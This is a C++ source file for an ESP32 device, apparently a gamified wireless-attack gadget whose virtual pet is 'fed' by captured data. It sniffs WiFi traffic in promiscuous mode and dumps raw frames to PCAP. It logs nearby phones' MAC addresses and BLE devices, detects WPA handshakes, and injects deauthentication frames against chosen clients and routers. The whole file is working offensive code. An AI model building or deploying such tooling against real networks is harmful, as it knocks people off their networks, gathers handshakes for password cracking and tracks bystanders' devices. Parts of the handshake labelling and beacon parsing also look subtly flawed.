#include "packet_sniffer.h"
#include "zahl_pet.h"
#include "soul_ledger.h"
#include "channel_hopper.h"
#include "pcap_writer.h"
#include <esp_wifi.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ---- 802.11 frame structs ----
typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    unsigned seq_ctrl:16;
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

// ---- globals ----
LogEntry captureLog[MAX_LOG_ENTRIES];
LogEntry networkLog[MAX_LOG_ENTRIES];
int      captureLogIndex  = 0;
int      networkLogIndex  = 0;

char hauntNetworks[16][33];
int  hauntNetworkCount = 0;

// ---- soul pending queue (written from ISR-context callback) ----
#define SOUL_QUEUE_SIZE 16
static char     sqMac[SOUL_QUEUE_SIZE][18];
static int8_t   sqRssi[SOUL_QUEUE_SIZE];
static volatile int sqHead = 0, sqTail = 0;

static void queueSoul(const char* mac, int8_t rssi) {
    int next = (sqHead + 1) % SOUL_QUEUE_SIZE;
    if (next == sqTail) return; // full — drop
    strncpy(sqMac[sqHead], mac, 17);
    sqMac[sqHead][17] = '\0';
    sqRssi[sqHead] = rssi;
    sqHead = next;
}

static void processSoulQueue() {
    while (sqTail != sqHead) {
        const char* mac  = sqMac[sqTail];
        int8_t       rssi = sqRssi[sqTail];
        sqTail = (sqTail + 1) % SOUL_QUEUE_SIZE;

        if (addSoul(mac, "", SOUL_PROBE, rssi)) {
            Zahl.consumeSoul(SOUL_PROBE);
        }
    }
}

// ---- filter ----
static wifi_promiscuous_filter_t pFilter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// ---- promiscuous callback ----
static void IRAM_ATTR promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt  = (wifi_promiscuous_pkt_t*)buf;
    wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;

    int8_t rssi = pkt->rx_ctrl.rssi;
    uint16_t fc = hdr->frame_ctrl;
    uint8_t ftype  = (fc & 0x000C) >> 2;
    uint8_t fstype = (fc & 0x00F0) >> 4;

    // Write raw frame to PCAP (before anything else)
    writePcapPacket(pkt->payload, pkt->rx_ctrl.sig_len);

    if (type == WIFI_PKT_MGMT) {
        // Probe request (subtype 4)
        if (fstype == 4) {
            char mac[18];
            snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
            addToCaptureLog(mac, rssi);
            queueSoul(mac, rssi);
        }
        // Beacon (subtype 8) — extract SSID
        if (fstype == 8) {
            uint8_t* body   = pkt->payload + sizeof(wifi_ieee80211_mac_hdr_t);
            uint16_t bodyLen = pkt->rx_ctrl.sig_len;
            // skip fixed params (12 bytes: timestamp 8 + interval 2 + capability 2)
            int pos = 12;
            while (pos + 2 < bodyLen) {
                uint8_t id  = body[pos];
                uint8_t len = body[pos + 1];
                if (id == 0 && len > 0 && len <= 32) { // SSID element
                    char ssid[33] = {0};
                    memcpy(ssid, body + pos + 2, len);
                    addToNetworkLog(ssid, rssi);
                    break;
                }
                pos += 2 + len;
            }
        }
    }

    // EAPOL handshake detection
    if (type == WIFI_PKT_DATA && ftype == 2) {
        uint8_t* payload = pkt->payload + sizeof(wifi_ieee80211_mac_hdr_t);
        int16_t  remain  = pkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t);
        // QoS data has 2 extra header bytes
        if ((fc & 0x0080) && remain > 2) { payload += 2; remain -= 2; }
        // LLC/SNAP: AA AA 03 00 00 00
        if (remain > 8 && payload[0] == 0xAA && payload[1] == 0xAA) {
            payload += 6; remain -= 6; // skip LLC+SNAP
            if (remain > 2 && payload[0] == 0x88 && payload[1] == 0x8E) {
                captureHandshake(hdr->addr3); // addr3 = BSSID in data frames
            }
        }
    }
}

// ---- public functions ----
void initPacketSniffer() {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&pFilter);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCb);
    initChannelHopper();
    Serial.println("Packet sniffer active");
}

void resumePromiscuous() {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&pFilter);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCb);
}

void runSnifferCycle() {
    hopChannel();
    processSoulQueue();

    static uint32_t lastScan = 0;
    if (millis() - lastScan > 15000) {
        lastScan = millis();
        int n = WiFi.scanComplete();
        if (n == -2) {
            WiFi.scanNetworks(true);
        } else if (n > 0) {
            hauntNetworkCount = 0;
            for (int i = 0; i < n && i < 16; i++) {
                String ssid = WiFi.SSID(i);
                if (ssid.length() > 0) {
                    addToNetworkLog(ssid.c_str(), WiFi.RSSI(i));
                    if (hauntNetworkCount < 16) {
                        strlcpy(hauntNetworks[hauntNetworkCount], ssid.c_str(), 33);
                        hauntNetworkCount++;
                    }
                }
            }
            WiFi.scanDelete();
        }
    }
}

void sendDeauthFrame(uint8_t* targetMac, uint8_t* routerMac) {
    uint8_t pkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // dst broadcast
        0,0,0,0,0,0,                  // src (router)
        0,0,0,0,0,0,                  // bssid (router)
        0x00, 0x00,
        0x07, 0x00                    // reason 7: class 3 from non-assoc
    };
    memcpy(pkt + 4,  targetMac, 6);
    memcpy(pkt + 10, routerMac, 6);
    memcpy(pkt + 16, routerMac, 6);
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);

    Zahl.feed(2);
    if (Zahl.corrosion < 100) Zahl.corrosion += 3;
    if (Zahl.corruption < 100) Zahl.corruption = min(100, (int)Zahl.corruption + 3);
    Serial.println("Deauth sent");
}

int captureHandshake(uint8_t* bssid) {
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02x:%02x:%02x:%02x:%02x:%02x",
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    char label[34] = "WPA_HAND";
    // try to match against known networks
    for (int i = 0; i < networkLogIndex && i < MAX_LOG_ENTRIES; i++) {
        strlcpy(label, networkLog[i % MAX_LOG_ENTRIES].data, 33);
    }

    if (addSoul(bssidStr, label, SOUL_HAND, -60)) {
        Zahl.consumeSoul(SOUL_HAND);
        Serial.printf("Handshake: %s\n", bssidStr);
        return 1;
    }
    return 0;
}

// BLE scan callback
class GrimBLECallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice dev) override {
        String addr = dev.getAddress().toString().c_str();
        String name = dev.haveName() ? dev.getName().c_str() : "BLE";
        addToCaptureLog(addr.c_str(), dev.getRSSI());
        if (addSoul(addr.c_str(), name.c_str(), SOUL_BLE, dev.getRSSI())) {
            Zahl.consumeSoul(SOUL_BLE);
        }
    }
};

void scanBLEDevices() {
    Serial.println("BLE scan start");
    esp_wifi_set_promiscuous(false);

    BLEDevice::init("GRIMWALKER");
    BLEScan* scan = BLEDevice::getScan();
    scan->setAdvertisedDeviceCallbacks(new GrimBLECallbacks(), true);
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    scan->start(5, false);
    scan->clearResults();
    BLEDevice::deinit(true);

    resumePromiscuous();
    Serial.println("BLE scan done");
}

void addToCaptureLog(const char* data, int rssi) {
    int idx = captureLogIndex % MAX_LOG_ENTRIES;
    strlcpy(captureLog[idx].data, data, 31);
    captureLog[idx].rssi = rssi;
    captureLog[idx].time = millis();
    captureLogIndex++;
}

void addToNetworkLog(const char* ssid, int rssi) {
    // deduplicate
    for (int i = 0; i < min(networkLogIndex, MAX_LOG_ENTRIES); i++) {
        if (strncmp(networkLog[i % MAX_LOG_ENTRIES].data, ssid, 31) == 0) {
            networkLog[i % MAX_LOG_ENTRIES].rssi = rssi;
            networkLog[i % MAX_LOG_ENTRIES].time = millis();
            return;
        }
    }
    int idx = networkLogIndex % MAX_LOG_ENTRIES;
    strlcpy(networkLog[idx].data, ssid, 31);
    networkLog[idx].rssi = rssi;
    networkLog[idx].time = millis();
    networkLogIndex++;
}
